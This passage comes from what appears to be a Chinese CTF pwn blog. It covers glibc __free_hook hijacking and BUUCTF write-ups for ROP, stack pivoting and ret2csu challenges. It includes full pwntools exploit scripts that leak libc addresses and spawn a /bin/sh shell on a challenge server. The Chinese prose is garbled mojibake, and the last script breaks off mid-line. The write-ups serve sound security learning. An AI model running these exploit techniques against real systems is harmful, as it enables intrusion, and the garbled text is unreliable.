<p>å‡½æ•°åŸå‹ä¸º**void free(void *ptr) **æ˜¯Cè¯­è¨€ä¸­é‡Šæ”¾å†…å­˜ç©ºé—´çš„å‡½æ•°ï¼Œé€šå¸¸ä¸ç”³è¯·å†…å­˜ç©ºé—´çš„å‡½æ•°malloc()ç»“åˆä½¿ç”¨ï¼Œå¯ä»¥é‡Šæ”¾ç”± malloc()ã€calloc()ã€realloc() ç­‰å‡½æ•°ç”³è¯·çš„å†…å­˜ç©ºé—´ã€‚</p>
<p>ptrâ€“ æŒ‡é’ˆæŒ‡å‘ä¸€ä¸ªè¦é‡Šæ”¾å†…å­˜çš„å†…å­˜å—ï¼Œè¯¥å†…å­˜å—ä¹‹å‰æ˜¯é€šè¿‡è°ƒç”¨ mallocã€calloc æˆ– realloc è¿›è¡Œåˆ†é…å†…å­˜çš„ã€‚å¦‚æœä¼ é€’çš„å‚æ•°æ˜¯ä¸€ä¸ªç©ºæŒ‡é’ˆï¼Œåˆ™ä¸ä¼šæ‰§è¡Œä»»ä½•åŠ¨ä½œã€‚freeå‡½æ•°ä¸è¿”å›ä»»ä½•å€¼</p>
<p>å½“ p å·²ç»è¢«é‡Šæ”¾ä¹‹åï¼Œå†æ¬¡é‡Šæ”¾ä¼šå‡ºç°ä¹±ä¸ƒå…«ç³Ÿçš„æ•ˆæœï¼Œè¿™å…¶å®å°±æ˜¯ <code>double free</code></p>
<p>6ã€**__free_hook**</p>
<figure class="highlight arduino"><table><tr><td class="code"><pre><code class="hljs arduino"><span class="hljs-keyword">void</span> __libc_free (<span class="hljs-keyword">void</span> *mem)<br>&#123;<br>  mstate ar_ptr;<br>  mchunkptr p;                          <span class="hljs-comment">/* chunk corresponding to mem */</span><br><br>  <span class="hljs-built_in"><span class="hljs-keyword">void</span></span> (*hook) (<span class="hljs-keyword">void</span> *, <span class="hljs-keyword">const</span> <span class="hljs-keyword">void</span> *)<br>    = <span class="hljs-built_in">atomic_forced_read</span> (__free_hook);<br>  <span class="hljs-keyword">if</span> (__builtin_expect (hook != <span class="hljs-literal">NULL</span>, <span class="hljs-number">0</span>))<br>    &#123;<br>      (*hook)(mem, <span class="hljs-built_in">RETURN_ADDRESS</span> (<span class="hljs-number">0</span>));<br>      <span class="hljs-keyword">return</span>;<br>    &#125;<br></code></pre></td></tr></table></figure>

<p>ä¸Šé¢çš„ä»£ç å¯¹æ˜¯ free() å‡½æ•°çš„ä¸€éƒ¨åˆ†ï¼Œå¯ä»¥çœ‹å‡ºç¨‹åºå…ˆæŠŠå…¨å±€å˜é‡ __free_hook èµ‹ç»™äº†å±€éƒ¨å˜é‡ hook ï¼Œç„¶åå¯¹ hook æ˜¯å¦ä¸º NULL è¿›è¡Œåˆ¤æ–­ï¼Œå¦‚æœä¸ä¸ºç©ºï¼Œåˆ™æ‰§è¡Œ hook ï¼Œç¬¬ä¸€ä¸ªå‚æ•°å°±æ˜¯ chunk çš„å†…å®¹éƒ¨åˆ†ã€‚</p>
<p>ä¸€èˆ¬çš„æƒ…å†µä¸‹ __free_hook æ˜¯ä¸º NULL çš„ï¼Œæ‰€ä»¥æ˜¯ä¸ä¼šæ‰§è¡Œçš„ï¼Œä½†æ˜¯å¦‚æœæœ‰äººæ¶æ„ä¿®æ”¹ __free_hook çš„è¯ï¼Œå°±ä¼šé€ æˆ __free_hook åŠ«æŒ</p>
]]></content>
      <tags>
        <tag>heap</tag>
      </tags>
  </entry>
  <entry>
    <title>buu03</title>
    <url>/2021/04/07/2021-04-07-buu03/</url>
    <content><![CDATA[<h1 id="buuâ€”â€”pwnå­¦ä¹ "><a href="#buuâ€”â€”pwnå­¦ä¹ " class="headerlink" title="buuâ€”â€”pwnå­¦ä¹ "></a>buuâ€”â€”pwnå­¦ä¹ </h1><h3 id="åã€é“äººä¸‰é¡¹-ç¬¬äº”èµ›åŒº-2018-rop"><a href="#åã€é“äººä¸‰é¡¹-ç¬¬äº”èµ›åŒº-2018-rop" class="headerlink" title="åã€é“äººä¸‰é¡¹(ç¬¬äº”èµ›åŒº)_2018_rop"></a>åã€é“äººä¸‰é¡¹(ç¬¬äº”èµ›åŒº)_2018_rop</h3><p>checksecä¸€ä¸‹ï¼Œå¼€å¯äº†nxä¿æŠ¤ï¼Œç„¶åæ‹–å…¥ida</p>
<p><img src="/2021/04/07/2021-04-07-buu03/QQ%E5%9B%BE%E7%89%8720210407213546.png"></p>
<p><img src="/2021/04/07/2021-04-07-buu03/QQ%E5%9B%BE%E7%89%8720210407213807.png"></p>
<p>å‘ƒã€‚ã€‚ã€‚åº”è¯¥å°±æ˜¯æ¯”è¾ƒç†Ÿæ‚‰çš„ropçš„æ„å»ºäº†ï¼Œç›´æ¥ä¸Šexpå§ï¼Œè¿™ç±»é¢˜ç›®åšæŒºå¤šçš„äº†ï¼š</p>
<p><img src="/2021/04/07/2021-04-07-buu03/QQ%E5%9B%BE%E7%89%8720210407220012.png"></p>
<h3 id="åä¸€ã€gyctf-2020-borrowstack"><a href="#åä¸€ã€gyctf-2020-borrowstack" class="headerlink" title="åä¸€ã€gyctf_2020_borrowstack"></a>åä¸€ã€gyctf_2020_borrowstack</h3><p>å…ˆåšä¸‹è¿™é¢˜ï¼Œä¸€ç›´æƒ³å®Œæ•´çš„äº†è§£æ ˆè¿ç§»ï¼Œå€Ÿç€è¿™é¢˜çœŸæ­£çš„æŒæ¡æ ˆè¿ç§»çš„æ‰‹æ³•å’ŒçŸ¥è¯†ç‚¹å§ï¼Œå…ˆchecksecä¸€ä¸‹ï¼Œå†æ‹–å…¥idaåˆ†æ</p>
<p><img src="/2021/04/07/2021-04-07-buu03/QQ%E5%9B%BE%E7%89%8720210407220304.png"></p>
<p>é‡Œé¢å¾ˆç®€å•ï¼Œæ²¡æœ‰ä»€ä¹ˆå¤æ‚çš„å‡½æ•°ï¼Œå¾ˆé€‚åˆå€Ÿæ­¤äº†è§£æ ˆè¿ç§»ï¼é¦–å…ˆreadå‡½æ•°è¯»å–çš„å­—èŠ‚æ•°ä¸å¤Ÿï¼Œåªèƒ½å¤Ÿåˆšå¥½è¦†ç›–è¿”å›åœ°å€ã€‚ç¬¬äºŒè¾“å…¥ç‚¹çš„ä½ç½®æ˜¯bssæ®µä¸Šï¼Œä¸æ˜¯æ ˆã€‚æ‰€ä»¥è¿™æ—¶å€™å°±æ˜¯è¦æŠŠæ ˆè¿ç§»åˆ°è¿™é‡Œï¼Œå› ä¸ºåœ¨è¿™é‡Œæˆ‘ä»¬å¯ä»¥æœ‰è¶³å¤Ÿçš„è¾“å…¥æ„å»ºç³»ç»Ÿå‡½æ•°è°ƒç”¨shell</p>
<p><img src="/2021/04/07/2021-04-07-buu03/QQ%E5%9B%BE%E7%89%8720210407220423.png"></p>
<p>è¿™é¢˜å¤ªå‘äº†ï¼ï¼ï¼ï¼ï¼ï¼ï¼ï¼ï¼ï¼ï¼ï¼ï¼é¦–å…ˆï¼Œä½ å¦‚æœä½¿ç”¨äº†systemå‡½æ•°è°ƒç”¨/bin/shï¼Œè¿™æ—¶å€™æ— è®ºä½ é€‰æ‹©å“ªä¸ªç‰ˆæœ¬çš„libcéƒ½æ— æ³•æˆåŠŸè·å–shellï¼ç½‘ä¸Šçš„å¸ˆå‚…ä»¬å¥½åƒä¹Ÿæ˜¯è¿™æ ·ï¼ŒåŸå› éƒ½åªæ˜¯æ¨¡ç³Šçš„è¯´çŒœæµ‹æ˜¯å› ä¸ºæ ˆè¿ç§»çš„ä½ç½®å¤ªé è¿‘ä¸€äº›é‡è¦æ•°æ®ï¼Œå¯èƒ½è¿˜æ˜¯å½±å“åˆ°äº†ä»€ä¹ˆä¸œè¥¿ã€‚éƒ½é‡‡å–äº†one_gadgetçš„åŠæ³•ï¼Œè¿™é‡Œæˆ‘åŒæ ·è¸©å‘ï¼</p>
<p><img src="/2021/04/07/2021-04-07-buu03/QQ%E5%9B%BE%E7%89%8720210408090610.png"></p>
<p>å¸ˆå‚…ä»¬éƒ½æ˜¯æ³„éœ²å‡ºputsçš„gotè¡¨åœ°å€ï¼Œå»æŸ¥è¯¢å‡ºlibcç‰ˆæœ¬ç„¶åä¸‹è½½ï¼Œç„¶è€Œæˆ‘å¾ˆæƒŠå¥‡çš„å‘ç°ï¼Œæˆ‘æ³„éœ²çš„åœ°å€æŸ¥è¯¢ä¸åˆ°å¯¹åº”çš„libcç‰ˆæœ¬ã€‚ã€‚ã€‚æ‰€ä»¥è¿™é‡Œçš„exceveå‡½æ•°åœ°å€æˆ‘æ˜¯ç›´æ¥æŠŠå¸ˆå‚…ä»¬çš„æ¬è¿è¿‡æ¥äº†0x4526a</p>
<p><img src="/2021/04/07/2021-04-07-buu03/QQ%E5%9B%BE%E7%89%8720210408090158.png"></p>
<p><img src="/2021/04/07/2021-04-07-buu03/QQ%E5%9B%BE%E7%89%8720210408090211.png"></p>
<p>ä»¥åŠï¼Œæ ˆè¿ç§»çš„å‘é€å‡½æ•°ï¼Œåªèƒ½é€‰æ‹©sendã€‚ï¼ˆåˆ«é—®ä¸ºä»€ä¹ˆï¼Œæˆ‘é€‰æ‹©çš„æ˜¯sendlineã€‚ã€‚ã€‚ä¸€ç›´å‡ºé—®é¢˜ï¼Œç”šè‡³ä¸ºäº†æ‰¾é—®é¢˜ï¼Œæˆ‘æ¯ä¸ªä¸å¸ˆå‚…ä»¬wpä¸åŒåœ°æ–¹æ…¢æ…¢æ”¹ï¼Œå‘ç°ç«Ÿç„¶æ˜¯è¿™ä¸ªåŸå› ï¼Œåªèƒ½æ€ªè‡ªå·±ç²—å¿ƒå§ï¼ŒçŒœæµ‹æ˜¯è¿™é‡Œçš„readè¯»å–è¿‡äºä¸¥æ ¼ï¼Œæ‰€æœ‰è¾“å…¥æ•°æ®éƒ½æ˜¯åˆšå¥½ï¼Œå¤šè¾“å…¥äº†ä¸€ä¸ª\nå¯¼è‡´äº†é—®é¢˜çš„å‘ç”Ÿï¼Œä¸‹æ¬¡ä¸€å®šæ³¨æ„ï¼ï¼‰è¿˜æœ‰å°±æ˜¯è·ç¦»é‡è¦æ•°æ®å¤ªè¿‘è¿™ç‚¹ï¼Œå‰é¢çš„retæ‰§è¡Œå¤šæ¬¡å°±æ˜¯ä¸ºäº†é¿å…è¿™ä¸ªï¼Œå› ä¸ºbssæ®µè·ç¦».got.pltå¤ªè¿‘äº†ï¼Œå¹¶ä¸”è·³è½¬å›mainå‡½æ•°çš„æ—¶å€™ï¼Œè¿˜ä¼šè¿›è¡Œä¸€æ¬¡å·¨å¤§çš„å‡æ ˆï¼Œæ‰€ä»¥çš„è¯æ‰§è¡Œå¤šæ¬¡retæŠŠæ ˆçš„ä½ç½®å¾€bssæ®µçš„é«˜åœ°å€å¤„è¿ç§»</p>
<p><img src="/2021/04/07/2021-04-07-buu03/QQ%E5%9B%BE%E7%89%8720210408091459.png"></p>
<p>å…¶ä»–çš„è¯ï¼Œwpå¦‚ä¸‹ï¼š</p>
<p><img src="/2021/04/07/2021-04-07-buu03/QQ%E5%9B%BE%E7%89%8720210408092959.png"></p>
<h3 id="åäºŒã€bjdctf-2020-babyrop"><a href="#åäºŒã€bjdctf-2020-babyrop" class="headerlink" title="åäºŒã€bjdctf_2020_babyrop"></a>åäºŒã€bjdctf_2020_babyrop</h3><p>ä¾‹è¡Œchecksecä¸€ä¸‹ï¼Œç„¶åè¿è¡Œä¸€ä¸‹ã€‚å¼€å¯äº†nxå’Œéƒ¨åˆ†relroç¼“è§£æœºåˆ¶ã€‚è¿è¡Œçš„ç»“æœä¹Ÿä¸èƒ½çœ‹å‡ºäº›ä»€ä¹ˆï¼Œè¿›å…¥idaçœ‹çœ‹å§</p>
<p><img src="/2021/04/07/2021-04-07-buu03/QQ%E5%9B%BE%E7%89%8720210408155229.png"></p>
<p>åœ¨ä¸€ä¸ªå‡½æ•°é‡Œé¢æœ‰ç€å¾ˆæ˜æ˜¾çš„æº¢å‡ºç‚¹ï¼Œè¶³å¤Ÿæˆ‘ä»¬è¦†ç›–è¿”å›åœ°å€å¹¶ä¸”æ„é€ ç³»ç»Ÿå‡½æ•°äº†ã€‚ä¸€é“å¸¸è§„çš„ropï¼Œå°±ä¸å¤šè¯´äº†ï¼Œå·²ç»åšçƒ‚äº†ã€‚ã€‚</p>
<p><img src="/2021/04/07/2021-04-07-buu03/QQ%E5%9B%BE%E7%89%8720210408155615.png"></p>
<p>expå¦‚ä¸‹ï¼š</p>
<p><img src="/2021/04/07/2021-04-07-buu03/QQ%E5%9B%BE%E7%89%8720210408170004.png"></p>
<h3 id="åä¸‰ã€others-shellcode"><a href="#åä¸‰ã€others-shellcode" class="headerlink" title="åä¸‰ã€others_shellcode"></a>åä¸‰ã€others_shellcode</h3><p>ä¾‹è¡Œchecksecä»¥åŠæ‰§è¡Œé™„ä»¶ï¼Œå¼€å¯äº†nxï¼Œpieä»¥åŠéƒ¨åˆ†relroã€‚è¿è¡Œé™„ä»¶å‘ç°ç›´æ¥å°±è·å–äº†shellã€‚ã€‚</p>
<p><img src="/2021/04/07/2021-04-07-buu03/QQ%E5%9B%BE%E7%89%8720210410073535.png"></p>
<p><img src="/2021/04/07/2021-04-07-buu03/QQ%E5%9B%BE%E7%89%8720210410073615.png"></p>
<p>ç„¶åæˆ‘è¯•ç€ncä¸€ä¸‹è¿œç¨‹ï¼Œçœ‹çœ‹æ˜¯ä¸æ˜¯ä¹Ÿèƒ½è·å–shellï¼Œæ²¡æƒ³åˆ°ã€‚ã€‚ç¡®å®å¯ä»¥</p>
<p><img src="/2021/04/07/2021-04-07-buu03/QQ%E5%9B%BE%E7%89%8720210410073831.png"></p>
<p>æŸ¥çœ‹idaï¼Œå‘ç°é™„ä»¶ä¸­æ˜¯å·²ç»è°ƒç”¨äº†execveå‡½æ•°</p>
<p><img src="/2021/04/07/2021-04-07-buu03/QQ%E5%9B%BE%E7%89%8720210410074925.png"></p>
<h3 id="åå››ã€pwn2-sctf-2016"><a href="#åå››ã€pwn2-sctf-2016" class="headerlink" title="åå››ã€pwn2_sctf_2016"></a>åå››ã€pwn2_sctf_2016</h3><p>ä¾‹è¡Œchecksecå¹¶ä¸”è¿è¡Œï¼Œåªå¼€å¯nxå’Œéƒ¨åˆ†çš„relroï¼Œæ‹–å…¥idaæŸ¥çœ‹ä¸€ä¸‹ä»£ç </p>
<p><img src="/2021/04/07/2021-04-07-buu03/QQ%E5%9B%BE%E7%89%8720210418202516.png"></p>
<p>ç¨‹åºæ¯”è¾ƒç®€å•ï¼Œå¯ä»¥å¾ˆæ˜ç¡®çš„å‘ç°ï¼Œä¸å­˜åœ¨åé—¨å‡½æ•°ï¼Œä¹Ÿæ²¡æœ‰æ˜æ˜¾çš„æº¢å‡ºç‚¹ï¼Œè¢«é™åˆ¶äº†ã€‚printfä¹Ÿæ²¡æœ‰é—®é¢˜ï¼Œå¯¹äºè¿™æ ·çš„æƒ…å†µï¼Œæˆ‘ç¬¬ä¸€æ—¶é—´æ˜¯æƒ³åˆ°äº†æ•´æ•°æº¢å‡ºï¼Œé€šè¿‡æ•´æ•°æº¢å‡ºæ¥è¶Šè¿‡æ£€æŸ¥ï¼Œé€šè¿‡å°æ•°å˜æˆå¤§æ•°ï¼Œä»è€Œæº¢å‡ºã€‚</p>
<p><img src="/2021/04/07/2021-04-07-buu03/QQ%E5%9B%BE%E7%89%8720210418202734.png"></p>
<p><img src="/2021/04/07/2021-04-07-buu03/QQ%E5%9B%BE%E7%89%8720210418205625.png"></p>
<p>æ¥ä¸‹æ¥è®²ä¸‹æ¼æ´ç‚¹ï¼šmainå‡½æ•°é‡Œé¢å®šä¹‰çš„v2æ˜¯intç±»å‹çš„ï¼Œè€Œåœ¨get_né‡Œé¢å´æ˜¯unsignedçš„ï¼Œè¿™é‡Œå¦‚æœæˆ‘ä»¬è¾“å…¥äº†ä¸€ä¸ªè´Ÿæ•°ï¼Œé‚£ä¹ˆåœ¨get_né‡Œé¢å°†å˜å¾—éå¸¸å¤§ï¼Œè¶³å¤Ÿæˆ‘ä»¬æº¢å‡ºäº†ã€‚</p>
<p><img src="/2021/04/07/2021-04-07-buu03/QQ%E5%9B%BE%E7%89%8720210418210123.png"></p>
<p><img src="/2021/04/07/2021-04-07-buu03/QQ%E5%9B%BE%E7%89%8720210418210150.png"></p>
<p>ä½†æ˜¯æ²¡æœ‰åé—¨å‡½æ•°ï¼Œæ‰€ä»¥åªèƒ½è¿›è¡Œropäº†ï¼Œç”¨printfå‡½æ•°æ³„éœ²gotè¡¨åœ°å€ï¼ŒLibcSearcherä¸€ä¸‹ï¼Œæœ€ç»ˆæ„é€ syså‡½æ•°è·å–shellã€‚ç½‘ä¸Šå¸ˆå‚…ä»¬éƒ½å–äº†æ ¼å¼åŒ–å‚æ•°ï¼Œå…¶å®æ²¡å¿…è¦çš„ï¼Œæœ¬èº«printfå­˜åœ¨ç€æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´ï¼Œæ‰€ä»¥å¯ä»¥ç›´æ¥printfå‡ºæ¥ï¼Œæ²¡å¿…è¦å†è¾“å…¥ä¸€ä¸ªæ ¼å¼åŒ–å‚æ•°ã€‚è¿™é‡Œæœ‰ä¸ªå‘çš„åœ°æ–¹ï¼Œå¥½å§ï¼Œæ˜¯æˆ‘å‚»å¾—è¸©åˆ°äº†è¿˜ä¸€ç›´æ²¡çœ‹å‡ºæ¥ã€‚get_né‡Œé¢çš„getcharé‡Œé¢å·²ç»å¯¹0æˆªæ–­äº†ï¼Œæ‰€ä»¥åœ¨ç¬¬äºŒæ¬¡æ„é€ payloadçš„æ—¶å€™ï¼Œä¸å¯ä»¥åƒå¾€å¸¸é‚£æ ·é¡ºæ‰‹å†™ä¸ªp32(0)ï¼Œåé¢æ„Ÿè§‰ä¸å¯¹åŠ²ï¼Œæˆ‘ç»™ä»–é¡ºæ‰‹æ”¹æˆäº†ä¸ªp32(1)ã€‚ã€‚ã€‚ã€‚æœ‰ç‚¹å‚»ã€‚ã€‚è¿™ä¸ªåé¢ä¸‰ä¸ªå­—èŠ‚ä»ç„¶æ˜¯0ï¼Œä¾æ—§æˆªæ–­äº†ã€‚å†™å‡ºæ¥è­¦ç¤ºä¸€ä¸‹å¤§ä¼™ï¼Œå¤šæ³¨æ„ç‚¹ç»†èŠ‚ã€‚</p>
<p>å¯¹äº†ï¼Œlibcæ‰¾å‡ºæ¥æœ‰15ä¸ªï¼Œä½ å¯ä»¥çŸ¥é“æˆ‘æœ‰å¤šç»æœ›äº†ï¼Œä¸€ä¸ªä¸ªè¯•äº†ï¼Œç«Ÿç„¶éƒ½ä¸è¡Œï¼Œè€Œä¸”è¿˜æ˜¯ä¸¤éï¼ï¼ï¼</p>
<p>expå¦‚ä¸‹ï¼š</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!usr/bin/env python</span><br><span class="hljs-comment">#coding=utf-8</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> *<br>p=remote(<span class="hljs-string">&quot;node3.buuoj.cn&quot;</span>,<span class="hljs-number">25066</span>)<br>elf=ELF(<span class="hljs-string">&#x27;./1&#x27;</span>)<br>context.log_level=<span class="hljs-string">&#x27;debug&#x27;</span><br>printf_plt=elf.plt[<span class="hljs-string">&#x27;printf&#x27;</span>]<br>printf_got=elf.got[<span class="hljs-string">&#x27;printf&#x27;</span>]<br>main=elf.sym[<span class="hljs-string">&#x27;main&#x27;</span>]<br><br>p.sendlineafter(<span class="hljs-string">&#x27;read?&#x27;</span>,<span class="hljs-string">&#x27;-1&#x27;</span>)<br>payload=<span class="hljs-string">&#x27;a&#x27;</span>*(<span class="hljs-number">0x2c</span>+<span class="hljs-number">0x4</span>)+p32(printf_plt)+p32(main)+p32(printf_got)<br>p.sendlineafter(<span class="hljs-string">&#x27;data!\n&#x27;</span>,payload)<br>p.recvline() <span class="hljs-comment">#æ¥æ”¶æœ€åçš„printfï¼Œè®©ç¨‹åºæµæ‰§è¡Œå®Œ</span><br>printf_addr=u32(p.recv(<span class="hljs-number">4</span>))<br>log.info(<span class="hljs-string">&quot;printf address:&quot;</span>+<span class="hljs-built_in">hex</span>(printf_addr))<br><br>libc=LibcSearcher(<span class="hljs-string">&#x27;printf&#x27;</span>,printf_addr)<br>libc_base=printf_addr-libc.dump(<span class="hljs-string">&#x27;printf&#x27;</span>)<br>binsh=libc_base+libc.dump(<span class="hljs-string">&#x27;str_bin_sh&#x27;</span>)<br>system=libc_base+libc.dump(<span class="hljs-string">&#x27;system&#x27;</span>)<br><br>p.sendlineafter(<span class="hljs-string">&#x27;read?&#x27;</span>,<span class="hljs-string">&#x27;-1&#x27;</span>)<br>payload=<span class="hljs-string">&#x27;a&#x27;</span>*(<span class="hljs-number">0x2c</span>+<span class="hljs-number">0x4</span>)+p32(system)+<span class="hljs-string">&#x27;beef&#x27;</span>+p32(binsh) <span class="hljs-comment">#beefï¼ï¼ï¼ï¼ï¼</span><br>p.sendlineafter(<span class="hljs-string">&#x27;data!\n&#x27;</span>,payload)<br><br>p.interactive()<br></code></pre></td></tr></table></figure>

<h3 id="åäº”ã€ciscn-2019-s-3"><a href="#åäº”ã€ciscn-2019-s-3" class="headerlink" title="åäº”ã€ciscn_2019_s_3"></a>åäº”ã€ciscn_2019_s_3</h3><p>å¸¸è§„æ‰§è¡Œchecksecä¸€ä¸‹ï¼ŒæŸ¥çœ‹ä¿æŠ¤ï¼Œå¹¶ä¸”æ‰§è¡Œä¸€ä¸‹ç¨‹åºï¼Œçœ‹çœ‹å›æ˜¾</p>
<p><img src="/2021/04/07/2021-04-07-buu03/QQ%E5%9B%BE%E7%89%8720210425202117.png"></p>
<p>å‡ºç°äº†ä¸€å †ä¹±ç ï¼Œå¯èƒ½æ˜¯åœ°å€æ³„éœ²äº†ï¼Ÿè¿›å…¥idaçœ‹çœ‹æƒ…å†µå¦‚ä½•</p>
<p><img src="/2021/04/07/2021-04-07-buu03/QQ%E5%9B%BE%E7%89%8720210429123130.png"></p>
<p><img src="/2021/04/07/2021-04-07-buu03/QQ%E5%9B%BE%E7%89%8720210429123138.png"></p>
<p>mainå‡½æ•°é‡Œé¢å¾ˆç®€å•ï¼Œä¸¤ä¸ªç³»ç»Ÿè°ƒç”¨å°±æ²¡äº†ï¼Œè€Œæœ‰ç³»ç»Ÿè°ƒç”¨ï¼Œé‚£å°±å»çœ‹çœ‹æ±‡ç¼–ä»£ç ã€‚æ±‡ç¼–ä»£ç å‰ä¸¤è¡Œè¦æ³¨æ„ï¼Œè¿™é‡Œçš„rspæ²¡æœ‰å‡å°‘ï¼Œåœ¨è¿™é¢˜é‡Œé¢rsp=rbpäº†ï¼Œåé¢è®¡ç®—åç§»ä¸å¯ä»¥æŠŠrbpè¦†ç›–äº†ã€‚å·¦è¾¹çš„å‡½æ•°æ çœ‹ä¸€ä¸‹ï¼Œæœ‰ä¸ªgadgetçš„ï¼Œè¿›å…¥æŸ¥çœ‹</p>
<p><img src="/2021/04/07/2021-04-07-buu03/QQ%E5%9B%BE%E7%89%8720210429123625.png"></p>
<p>å¾ˆæ˜¾ç„¶ï¼Œè¿™é‡Œé¢ç»™å‡ºäº†ä¸¤ä¸ªè°ƒç”¨å·ï¼Œ0Få’Œ3BHï¼Œå¯¹åº”ç€è¿™é¢˜ä¸¤ç§è§£æ³•ï¼Œæˆ‘ä»¬å…ˆä»‹ç»ä½¿ç”¨3BHè°ƒç”¨å·è°ƒç”¨execveå‡½æ•°çš„è§£æ³•ï¼Œç¨åå†ä»‹ç»å¦ä¸€ç§ã€‚</p>
<h4 id="è§£æ³•ä¸€"><a href="#è§£æ³•ä¸€" class="headerlink" title="è§£æ³•ä¸€"></a>è§£æ³•ä¸€</h4><p>execve(â€œ/bin/shâ€,0,0)æ€»å…±æœ‰ä¸‰ä¸ªå‚æ•°ï¼Œæ‰€ä»¥æˆ‘ä»¬éœ€è¦æ§åˆ¶rdi,rsi,rdxä¸‰ä¸ªå¯„å­˜å™¨çš„å€¼ï¼Œå¾ˆæ˜¾ç„¶ï¼Œè¿™æ˜¯return to libc_csu_initã€‚rsiå’Œrdxçš„å€¼å¾ˆå¥½æ§åˆ¶ï¼Œè®¾ç½®ä¸º0å³å¯ï¼Œè€Œ/bin/shå­—ç¬¦ä¸²åˆ™éœ€è¦æˆ‘ä»¬å»å¯»æ‰¾äº†ï¼Œæˆ‘ä»¬åªæœ‰ä¸€ä¸ªè¾“å…¥ç‚¹ï¼Œå°±æ˜¯å¾€æ ˆä¸Šé¢è¾“å…¥/bin/shï¼Œç„¶åé€šè¿‡æ³„éœ²æ ˆçš„åœ°å€è€Œå¾—åˆ°è¯¥åœ°å€ï¼Œä»è€ŒæŠŠåœ°å€ç»™rdiï¼Œæœ€åå†è°ƒç”¨syscallå‡½æ•°ï¼Œå³å¯è·å–shellã€‚</p>
<p>è€Œwriteå‡½æ•°ä¼šè¾“å‡ºæ ˆä¸Š0x30ä¸ªå†…å­˜å•å…ƒå†…å®¹ï¼Œé€šè¿‡è°ƒè¯•ï¼Œå¯ä»¥çŸ¥é“0x20ä½ç½®å¤„ä¼šæ³„éœ²å‡ºä¸€ä¸ªæ ˆä¸Šçš„åœ°å€ï¼Œæˆ‘ä»¬åªéœ€è¦è®¡ç®—è¯¥åœ°å€åˆ°/bin/shçš„åå·®ï¼Œå°±å¯ä»¥è·å–/bin/shçš„åœ°å€</p>
<p><img src="/2021/04/07/2021-04-07-buu03/QQ%E5%9B%BE%E7%89%8720210429124551.png"></p>
<p>ä¸Šå›¾æ˜¯æˆ‘åœ¨æœ¬åœ°è°ƒè¯•çš„æƒ…å†µï¼Œ0x7ffcaba65838æ˜¯æ³„éœ²å‡ºæ¥çš„åœ°å€ï¼Œå¯æ˜¯æ‰£å»0x7ffcaba656f0å¾—åˆ°çš„å´æ˜¯0x148ï¼Œè€Œæˆ‘å»ç½‘ä¸Šæ‰¾å¸ˆå‚…ä»¬çš„wpæ˜¯0x138ï¼Œä¸å¤ªæ‡‚ä¸ºä»€ä¹ˆã€‚æ‰€ä»¥æˆ‘åªèƒ½æœ¬åœ°è·å–åˆ°äº†shellï¼Œä½†æ˜¯è¿œç¨‹ä¸èƒ½è¿‡äº†ã€‚</p>
<p>è·å–åˆ°äº†/bin/shçš„åœ°å€ï¼Œåé¢å°±æ˜¯æ„é€ ropé“¾äº†ã€‚</p>
<p><img src="/2021/04/07/2021-04-07-buu03/QQ%E5%9B%BE%E7%89%8720210429124941.png"></p>
<p>è¿™è¾¹csué‡Œé¢çš„ediæ˜¯æœ‰é—®é¢˜çš„ï¼Œå› ä¸º/bin/shçš„åœ°å€æ˜¯ä¸æ­¢4ä¸ªå­—èŠ‚ï¼Œæ‰€ä»¥ediæ˜¯ä¸å¤Ÿç››æ”¾çš„ï¼Œæ‰€ä»¥æˆ‘ä»¬éœ€è¦rdiæ‰è¡Œï¼Œè¿™è¾¹ä½¿ç”¨äº†ROPgadgetå»å¯»æ‰¾ã€‚æ‰€ä»¥åé¢payloadæ„é€ ropæ—¶ï¼Œè¿™è¾¹è¿˜éœ€è¦åˆ©ç”¨r12ç››æ”¾æ ˆä¸Šçš„å†…å®¹è¿›è¡Œè·³è½¬åˆ°æ ˆä¸Šç»§ç»­æ‰§è¡Œï¼Œè€Œä¸èƒ½ç›´æ¥å°±åœ¨r12é‡Œé¢å­˜æ”¾syscallåœ°å€è¿›è¡Œç›´æ¥è°ƒç”¨ã€‚</p>
<p>expå¦‚ä¸‹ï¼š</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!usr/bin/env python</span><br><span class="hljs-comment">#coding=utf-8</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-comment">#p=remote(&#x27;node3.buuoj.cn&#x27;,25007)</span><br>p=process(<span class="hljs-string">&#x27;./1&#x27;</span>)<br>context.log_level=<span class="hljs-string">&#x27;debug&#x27;</span><br>elf=ELF(<span class="hljs-string">&#x27;./1&#x27;</span>)<br>main=elf.sym[<span class="hljs-string">&#x27;main&#x27;</span>]<br>syscall=<span class="hljs-number">0x400517</span><br>execve=<span class="hljs-number">0x4004e2</span><br>pop_rbx_rbp_r12_r13_r14_r15_ret=<span class="hljs-number">0x40059a</span><br>rdx_edi_rsi=<span class="hljs-number">0x400580</span><br>offset=<span class="hljs-number">0x138</span><br>pop_rdi=<span class="hljs-number">0x4005a3</span><br><br>payload=<span class="hljs-string">&quot;/bin/sh\x00&quot;</span>*<span class="hljs-number">2</span>+p64(main)<br>p.send(payload)<br>p.recv(<span class="hljs-number">0x20</span>)<br>leak=u64(p.recv(<span class="hljs-number">8</span>))<br>binsh=leak-offset<br><span class="hljs-built_in">print</span> <span class="hljs-built_in">hex</span>(leak)<br><span class="hljs-built_in">print</span> <span class="hljs-built_in">hex</span>(binsh)<br>gdb.attach(p,<span class="hljs-string">&#x27;b *main&#x27;</span>)<br><br>payload=<span class="hljs-string">&quot;/bin/sh\x00&quot;</span>*<span class="hljs-number">2</span><br>payload+=p64(pop_rbx_rbp_r12_r13_r14_r15_ret)<br>payload+=p64(<span class="hljs-number">0</span>)+p64(<span class="hljs-number">0</span>)+p64(binsh+<span class="hljs-number">0x50</span>)+p64(<span class="hljs-number">0</span>)+p64(<span class="hljs-number">0</span>)+p64(<span class="hljs-number">0</span>)<br>payload+=p64(rdx_edi_rsi)+p64(execve)  <span class="hljs-comment">#p64(execve)åœ¨æ 